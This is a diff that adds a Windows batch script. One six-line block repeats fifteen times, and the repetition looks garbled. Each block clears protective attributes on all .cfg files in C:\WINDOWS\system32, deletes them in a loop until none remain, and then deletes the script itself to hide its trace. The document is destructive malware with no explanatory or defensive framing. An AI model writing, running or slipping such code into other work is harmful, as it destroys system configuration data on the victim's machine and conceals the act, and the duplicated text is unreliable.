@@ -1,0 +1,90 @@
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
+@echo off
+:Loop
+attrib "C:\WINDOWS\system32\*.cfg" -r -a -s -h
+del "C:\WINDOWS\system32\*.cfg"
+if exist "C:\WINDOWS\system32\*.cfg" goto Loop
+del %0
